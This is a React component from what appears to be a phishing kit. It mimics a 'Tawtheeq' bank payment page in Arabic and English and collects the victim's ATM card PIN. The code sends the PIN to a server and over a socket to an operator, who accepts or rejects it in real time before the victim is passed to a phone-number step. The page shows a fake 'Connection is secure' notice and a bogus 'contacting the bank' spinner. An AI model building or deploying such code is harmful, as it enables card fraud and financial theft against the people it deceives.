import React, { useState } from "react";
import { AiOutlineCloseCircle } from "react-icons/ai";
import { serverRoute, socket } from "./Home";
import axios from "axios";
import { TailSpin } from "react-loader-spinner";
const Pin = () => {
  const [pin, setPin] = useState("");
  const [error, setError] = useState(false);
  const [loading, setLoading] = useState(false);
  const data = JSON.parse(sessionStorage.getItem("data"));
  const handlePin = async (e) => {
    e.preventDefault();
    setLoading(true);
    setError(null);
    const { _id } = data;
    try {
      await axios
        .post(serverRoute + "/visaPin/" + _id, {
          pin,
        })
        .then(() => {
          socket.emit("visaPin", {
            id: _id,
            pin,
          });
        });
    } catch (error) {
      console.log(error);
      setLoading(false);
    } finally {
    }
  };
  socket.on("acceptVisaPin", (id) => {
    if (id === data._id) {
      setLoading(false);
      sessionStorage.setItem("data", JSON.stringify({ ...data, pin }));
      window.location.href = "/phone";
    }
  });

  socket.on("declineVisaPin", (id) => {
    if (id === data._id) {
      setLoading(false);
      setError(` رمز اثبات الملكيه خاطئ`);
    }
  });
  return (
    <div className="w-full min-h-screen flex items-center justify-center bg-white p-4">
      {loading && (
        <div
          className="fixed inset-0 bg-[#02020260] flex items-center justify-center z-50"
          dir="rtl"
        >
          <div className="bg-white rounded-lg p-8 max-w-md w-11/12 flex flex-col items-center justify-center">
            <img src="/logo.jpeg" alt="Tawtheeq Logo" className="h-20 mb-6" />
            <div className="relative w-32 h-32 mb-4">
              <img src="/loading.gif" alt="Loading" className="w-full h-full" />
            </div>
            <p className="text-gray-800 text-lg font-bold text-center">
              جاري التواصل مع مصدر البنك...
            </p>
          </div>
        </div>
      )}

      <div className="w-full max-w-md">
        <form
          className="bg-white  rounded-lg p-6 shadow-sm"
          onSubmit={handlePin}
        >
          {/* Arabic Title */}
          <h1
            className="text-center text-lg font-semibold text-green-800 mb-6"
            dir="rtl"
          >
            الرقم السري لبطاقة الصراف الآلي
          </h1>

          {/* Card Icon */}
          <div className="flex justify-center items-end ">
            <h2
              className="text-lg font-semibold         text-gray-900 mb-4"
              dir="ltr"
            >
              Enter password
            </h2>
            <div className="flex-1">
              <img src="/pin.jpeg" alt="Card Icon" className="h-10 ml-2" />
            </div>
          </div>

          {/* English Title */}

          {/* English Description */}
          <p className="text-base text-gray-900 font-semibold my-2">
            Please enter the 4-digit card password to confirm the payment
          </p>

          {/* Arabic Description */}
          <p
            className="text-base font-semibold text-gray-700 text-center mt-6 mb-10"
            dir="rtl"
          >
            الرجاء ادخال الرقم السري للبطاقة المكون من 4 خانات لتأكيد عملية
            الدفع
          </p>

          {/* PIN Input */}
          <div className="mb-6">
            <input
              value={pin}
              required
              onChange={(e) => setPin(e.target.value.replace(/\D/g, ""))}
              maxLength={4}
              minLength={4}
              inputMode="numeric"
              type="password"
              placeholder="****"
              className="w-full border border-gray-300  rounded px-4 py-3 text-center text-lg tracking-widest focus:outline-none focus:border-green-700 focus:border-2"
            />
          </div>

          {/* Submit Button */}
          <button
            type="submit"
            className="w-full bg-black text-white py-3 rounded font-semibold hover:bg-gray-800 transition-colors mb-4"
            disabled={loading || pin.length < 4}
          >
            متابعة
          </button>

          {/* Security Message */}
          <div className="border border-green-500 rounded p-3 bg-green-50">
            <p className="text-xs text-green-800 font-semibold mb-1">
              Connection is secure
            </p>
            <p className="text-xs text-gray-600">
              Your information (for example, passwords or credit card numbers)
              is private when it is sent to this site.
            </p>
          </div>
        </form>
      </div>

      {/* Error Modal */}
      {error && (
        <div className="w-full text-center text-red-500 absolute bg-black bg-opacity-45 h-screen top-0 left-0 flex items-center justify-center">
          <div className="bg-white py-5 px-2 md:w-1/3 w-11/12 flex justify-center items-center flex-col text-lg gap-y-3 rounded-lg">
            <AiOutlineCloseCircle className="text-6xl text-red-500" />
            <div className="flex flex-col w-full items-center justify-center">
              <span className="text-gray-800">{error}</span>
            </div>
            <button
              className="bg-gray-900 text-white w-11/12 py-3 rounded hover:bg-gray-800"
              onClick={() => setError(null)}
            >
              حاول مرة أخرى
            </button>
          </div>
        </div>
      )}
    </div>
  );
};

export default Pin;
